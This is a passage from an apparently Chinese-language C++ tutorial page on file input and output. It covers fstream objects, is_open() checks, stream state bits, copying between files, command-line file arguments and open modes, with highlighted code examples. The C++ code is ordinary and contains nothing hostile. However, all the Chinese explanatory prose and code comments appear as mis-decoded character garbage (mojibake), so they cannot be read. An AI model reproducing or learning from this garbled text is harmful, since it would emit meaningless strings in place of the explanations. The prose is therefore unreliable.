çš„åŸºæœ¬æ­¥éª¤ï¼š</p><ol><li> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> <code>#include &lt;fstream&gt;</code>ã€‚</li><li> <strong>åˆ›å»ºæµå¯¹è±¡:</strong> åˆ›å»ºä¸€ä¸ª <code>ifstream</code> (ç”¨äºè¯»å–) æˆ– <code>ofstream</code> (ç”¨äºå†™å…¥) æˆ– <code>fstream</code> (ç”¨äºè¯»å†™) å¯¹è±¡ã€‚</li><li> <strong>å…³è”æ–‡ä»¶:</strong> å°†æµå¯¹è±¡ä¸ä¸€ä¸ªå…·ä½“çš„æ–‡ä»¶å…³è”èµ·æ¥ã€‚è¿™å¯ä»¥åœ¨åˆ›å»ºå¯¹è±¡æ—¶é€šè¿‡æ„é€ å‡½æ•°å®Œæˆï¼Œä¹Ÿå¯ä»¥ä¹‹åä½¿ç”¨ <code>open()</code> æ–¹æ³•ã€‚</li><li> <strong>æ£€æŸ¥æ˜¯å¦æˆåŠŸæ‰“å¼€:</strong> ä½¿ç”¨ <code>is_open()</code> æ–¹æ³•æˆ–æ£€æŸ¥æµå¯¹è±¡çš„çŠ¶æ€æ¥ç¡®è®¤æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚</li><li> <strong>è¿›è¡Œ I/O æ“ä½œ:</strong> ä½¿ç”¨ <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>get()</code>, <code>getline()</code>, <code>write()</code>, <code>read()</code> ç­‰æ–¹æ³•è¯»å†™æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨ <code>cin</code> å’Œ <code>cout</code> ä¸€æ ·ã€‚</li><li> <strong>å…³é—­æ–‡ä»¶:</strong> ä½¿ç”¨ <code>close()</code> æ–¹æ³•å…³é—­æ–‡ä»¶ï¼Œæ–­å¼€æµå¯¹è±¡ä¸æ–‡ä»¶çš„å…³è”ã€‚<strong>é‡è¦:</strong> å½“æ–‡ä»¶æµå¯¹è±¡ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼ˆä¾‹å¦‚å‡½æ•°ç»“æŸï¼‰ï¼Œå…¶ææ„å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨ <code>close()</code>ï¼Œå› æ­¤æ˜¾å¼è°ƒç”¨ <code>close()</code> é€šå¸¸ä¸æ˜¯å¿…éœ€çš„ï¼Œä½†æœ‰æ—¶ä¸ºäº†æ˜ç¡®æˆ–æ£€æŸ¥å…³é—­çŠ¶æ€å¯ä»¥è¿™æ ·åšã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼šå†™å…¥æ–‡ä»¶</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt; // åŒ…å« fstream å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»º ofstream å¯¹è±¡å¹¶é€šè¿‡æ„é€ å‡½æ•°å…³è”æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// é»˜è®¤ä»¥è¾“å‡ºæ¨¡å¼ (ios_base::out) æ‰“å¼€ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™æ¸…ç©ºå†…å®¹</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(<span class="string">&quot;mydata.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€</span></span><br><span class="line">    <span class="keyword">if</span> (!outFile.is_open()) &#123; <span class="comment">// æˆ–è€… if (!outFile)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for writing!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å‘æ–‡ä»¶å†™å…¥æ•°æ® (ç±»ä¼¼ cout)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">95.5</span>;</span><br><span class="line"></span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data written to mydata.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å…³é—­æ–‡ä»¶ (å¯é€‰ï¼Œææ„å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨)</span></span><br><span class="line">    <span class="comment">// outFile.close();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// outFile åœ¨è¿™é‡Œç¦»å¼€ä½œç”¨åŸŸï¼Œææ„å‡½æ•°è°ƒç”¨ close()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šè¯»å–æ–‡ä»¶</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»º ifstream å¯¹è±¡å¹¶å…³è”æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// é»˜è®¤ä»¥è¾“å…¥æ¨¡å¼ (ios_base::in) æ‰“å¼€</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;mydata.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€</span></span><br><span class="line">    <span class="keyword">if</span> (!inFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for reading!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading data from mydata.txt:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. ä»æ–‡ä»¶è¯»å–æ•°æ® (ç±»ä¼¼ cin)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="comment">// é€è¡Œè¯»å–</span></span><br><span class="line">    <span class="keyword">while</span> (getline(inFile, line)) &#123; <span class="comment">// ä½¿ç”¨å…¨å±€ getline è¯»å–æ•´è¡Œåˆ° string</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æˆ–è€…ï¼Œå¦‚æœçŸ¥é“æ ¼å¼ï¼Œå¯ä»¥åƒ cin ä¸€æ ·è¯»å–</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    std::string label1, name, label2, label3;</span></span><br><span class="line"><span class="comment">    int age;</span></span><br><span class="line"><span class="comment">    double score;</span></span><br><span class="line"><span class="comment">    inFile &gt;&gt; label1 &gt;&gt; name &gt;&gt; label2 &gt;&gt; age &gt;&gt; label3 &gt;&gt; score;</span></span><br><span class="line"><span class="comment">    if (inFile) &#123; // æ£€æŸ¥è¯»å–æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; &quot;Read Name: &quot; &lt;&lt; name &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; &quot;Read Age: &quot; &lt;&lt; age &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; &quot;Read Score: &quot; &lt;&lt; score &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        std::cerr &lt;&lt; &quot;Error reading data format.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å…³é—­æ–‡ä»¶ (å¯é€‰)</span></span><br><span class="line">    <span class="comment">// inFile.close();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-4-2-æµçŠ¶æ€æ£€æŸ¥å’Œ-is-open"><a href="#17-4-2-æµçŠ¶æ€æ£€æŸ¥å’Œ-is-open" class="headerlink" title="17.4.2 æµçŠ¶æ€æ£€æŸ¥å’Œ is_open()"></a>17.4.2 æµçŠ¶æ€æ£€æŸ¥å’Œ is_open()</h3><ul><li>  <strong><code>is_open()</code>:</strong> æ–‡ä»¶æµå¯¹è±¡æä¾› <code>is_open()</code> æˆå‘˜å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€å¹¶ä¸æµå…³è”ã€‚åœ¨å°è¯•è¿›è¡Œä»»ä½• I/O æ“ä½œä¹‹å‰ï¼Œ<strong>åŠ¡å¿…</strong>è°ƒç”¨æ­¤å‡½æ•°è¿›è¡Œæ£€æŸ¥ã€‚</li><li><strong>æµçŠ¶æ€ä½:</strong> æ–‡ä»¶æµå¯¹è±¡ä¹Ÿå…·æœ‰ä¸ <code>cin</code> ç›¸åŒçš„çŠ¶æ€ä½ (<code>goodbit</code>, <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>)ã€‚<ul><li>  å¦‚æœ <code>open()</code> å¤±è´¥ï¼Œæµå¯¹è±¡çš„çŠ¶æ€é€šå¸¸ä¼šè®¾ç½®ä¸º <code>failbit</code>ã€‚å› æ­¤ï¼Œ<code>if (!outFile)</code> æˆ– <code>if (!inFile)</code> ä¹Ÿå¯ä»¥ç”¨æ¥æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚</li><li>  åœ¨è¯»å–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°æ–‡ä»¶æœ«å°¾ï¼Œä¼šè®¾ç½® <code>eofbit</code>ã€‚</li><li>  å¦‚æœè¯»å–çš„æ•°æ®æ ¼å¼ä¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼Œè¯•å›¾å°†æ–‡æœ¬è¯»å…¥ <code>int</code>ï¼‰ï¼Œä¼šè®¾ç½® <code>failbit</code>ã€‚</li><li>  å¦‚æœå‘ç”Ÿåº•å±‚ I/O é”™è¯¯ï¼Œä¼šè®¾ç½® <code>badbit</code>ã€‚</li><li>  å¯ä»¥ä½¿ç”¨ <code>good()</code>, <code>eof()</code>, <code>fail()</code>, <code>bad()</code> æ¥æ£€æŸ¥è¿™äº›çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨ <code>clear()</code> æ¥æ¸…é™¤é”™è¯¯çŠ¶æ€ï¼ˆå¦‚æœå¯æ¢å¤ï¼‰ã€‚</li></ul></li></ul><h3 id="17-4-3-æ‰“å¼€å¤šä¸ªæ–‡ä»¶"><a href="#17-4-3-æ‰“å¼€å¤šä¸ªæ–‡ä»¶" class="headerlink" title="17.4.3 æ‰“å¼€å¤šä¸ªæ–‡ä»¶"></a>17.4.3 æ‰“å¼€å¤šä¸ªæ–‡ä»¶</h3><p>ä¸€ä¸ªç¨‹åºå¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡ä»¶ï¼Œåªéœ€ä¸ºæ¯ä¸ªæ–‡ä»¶åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶æµå¯¹è±¡å³å¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">sourceFile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">destFile</span><span class="params">(<span class="string">&quot;output.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sourceFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening input.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!destFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening output.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// sourceFile ä¼šè‡ªåŠ¨å…³é—­</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="keyword">while</span> (getline(sourceFile, line)) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç† line ...</span></span><br><span class="line">        destFile &lt;&lt; <span class="string">&quot;Copied: &quot;</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å†™å…¥åˆ°ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File copy finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sourceFile å’Œ destFile ä¼šåœ¨ main ç»“æŸæ—¶è‡ªåŠ¨å…³é—­</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-4-4-å‘½ä»¤è¡Œå¤„ç†æŠ€æœ¯"><a href="#17-4-4-å‘½ä»¤è¡Œå¤„ç†æŠ€æœ¯" class="headerlink" title="17.4.4 å‘½ä»¤è¡Œå¤„ç†æŠ€æœ¯"></a>17.4.4 å‘½ä»¤è¡Œå¤„ç†æŠ€æœ¯</h3><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨è¿è¡Œç¨‹åºæ—¶é€šè¿‡<strong>å‘½ä»¤è¡Œå‚æ•°</strong>æ¥æŒ‡å®šè¦å¤„ç†çš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¯å°†æ–‡ä»¶åç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ã€‚<code>main</code> å‡½æ•°å¯ä»¥æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong><code>argc</code> (argument count):</strong> ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°çš„<strong>æ•°é‡</strong>ï¼ˆåŒ…æ‹¬ç¨‹åºæœ¬èº«çš„åç§°ï¼‰ã€‚</li><li><strong><code>argv</code> (argument vector):</strong> ä¸€ä¸ªæŒ‡å‘ C é£æ ¼å­—ç¬¦ä¸²ï¼ˆ<code>char*</code>ï¼‰çš„<strong>æŒ‡é’ˆæ•°ç»„</strong>ã€‚<ul><li>  <code>argv[0]</code> é€šå¸¸æ˜¯ç¨‹åºæœ¬èº«çš„åç§°ã€‚</li><li>  <code>argv[1]</code> æ˜¯ç¬¬ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚</li><li>  <code>argv[2]</code> æ˜¯ç¬¬äºŒä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œä¾æ­¤ç±»æ¨ã€‚</li><li>  <code>argv[argc]</code> æ˜¯ä¸€ä¸ªç©ºæŒ‡é’ˆ (<code>nullptr</code>)ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // ç”¨äºå­˜å‚¨å‚æ•°</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥å‚æ•°æ•°é‡æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123; <span class="comment">// éœ€è¦ç¨‹åºå + è¾“å…¥æ–‡ä»¶å + è¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;input_file&gt; &lt;output_file&gt;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv[1] æ˜¯è¾“å…¥æ–‡ä»¶å, argv[2] æ˜¯è¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">sourceFile</span><span class="params">(argv[<span class="number">1</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">destFile</span><span class="params">(argv[<span class="number">2</span>])</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sourceFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening input file: &quot;</span> &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!destFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening output file: &quot;</span> &lt;&lt; argv[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... (æ–‡ä»¶å¤„ç†é€»è¾‘ï¼Œä¾‹å¦‚å¤åˆ¶) ...</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (sourceFile.get(ch)) &#123;</span><br><span class="line">        destFile.put(ch);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processed &quot;</span> &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; argv[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åï¼Œå¯ä»¥è¿™æ ·è¿è¡Œï¼š<code>./my_program data.in results.out</code></p><h3 id="17-4-5-æ–‡ä»¶æ¨¡å¼"><a href="#17-4-5-æ–‡ä»¶æ¨¡å¼" class="headerlink" title="17.4.5 æ–‡ä»¶æ¨¡å¼"></a>17.4.5 æ–‡ä»¶æ¨¡å¼</h3><p>åœ¨æ‰“å¼€æ–‡ä»¶æ—¶ï¼ˆé€šè¿‡æ„é€ å‡½æ•°æˆ– <code>open()</code> æ–¹æ³•ï¼‰ï¼Œå¯ä»¥æŒ‡å®š<strong>æ–‡ä»¶æ¨¡å¼ (file mode)</strong> æ¥æ§åˆ¶æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ã€‚æ–‡ä»¶æ¨¡å¼æ˜¯å®šä¹‰åœ¨ <code>ios_base</code> ç±»ä¸­çš„å¸¸é‡ï¼Œç±»å‹ä¸º <code>openmode</code> (ä¸€ç§ä½æ©ç ç±»å‹)ã€‚</p><p>å¸¸ç”¨çš„æ–‡ä»¶æ¨¡å¼æ ‡å¿—ï¼š</p><ul><li>  <strong><code>ios_base::in</code>:</strong> ä»¥<strong>è¯»å–</strong>æ¨¡å¼æ‰“å¼€ (ifstream é»˜è®¤)ã€‚</li><li>  <strong><code>ios_base::out</code>:</strong> ä»¥<strong>å†™å…¥</strong>æ¨¡å¼æ‰“å¼€ (ofstream é»˜è®¤)ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œ<strong>æ¸…ç©º</strong>å…¶å†…å®¹ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºã€‚</li><li>  <strong><code>ios_base::app</code> (append):</strong> ä»¥<strong>è¿½åŠ </strong>æ¨¡å¼æ‰“å¼€ã€‚å†™å…¥æ“ä½œå°†åœ¨æ–‡ä»¶æœ«å°¾è¿›è¡Œã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºã€‚æ­¤æ¨¡å¼ä¸‹é€šå¸¸éšå« <code>ios_base::out</code>ã€‚</li><li>  <strong><code>ios_base::ate</code> (at end):</strong> æ‰“å¼€æ–‡ä»¶å¹¶å°†åˆå§‹ä½ç½®å®šä½åˆ°<strong>æ–‡ä»¶æœ«å°¾</strong>ã€‚ä½†ä»å¯ä»¥åœ¨æ–‡ä»¶ä¸­çš„ä»»ä½•ä½ç½®å†™å…¥ï¼ˆä¸ <code>app</code> ä¸åŒï¼Œ<code>app</code> å¼ºåˆ¶å†™å…¥åˆ°æœ«å°¾ï¼‰ã€‚</li><li>  <strong><code>ios_base::binary</code>:</strong> ä»¥<strong>äºŒè¿›åˆ¶</strong>æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬æ¨¡å¼ã€‚åœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸‹ï¼Œä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ <code>\n</code> æˆ–å›è½¦ç¬¦ <code>\r</code>ï¼‰è¿›è¡Œè½¬æ¢ã€‚è¿™å¯¹äºè¯»å†™éæ–‡æœ¬æ–‡ä»¶ï¼ˆå¦‚å›¾åƒã€å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æˆ–éœ€è¦ç²¾ç¡®å­—èŠ‚æ§åˆ¶çš„æƒ…å†µè‡³å…³é‡è¦ã€‚</li><li>  <strong><code>ios_base::trunc</code> (truncate):</strong> å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œ<strong>æ¸…ç©º</strong>å…¶å†…å®¹ã€‚<code>ios_base::out</code> æ¨¡å¼é»˜è®¤åŒ…å«æ­¤è¡Œä¸ºã€‚</li></ul><p>å¯ä»¥ä½¿ç”¨<strong>æŒ‰ä½æˆ–è¿ç®—ç¬¦ 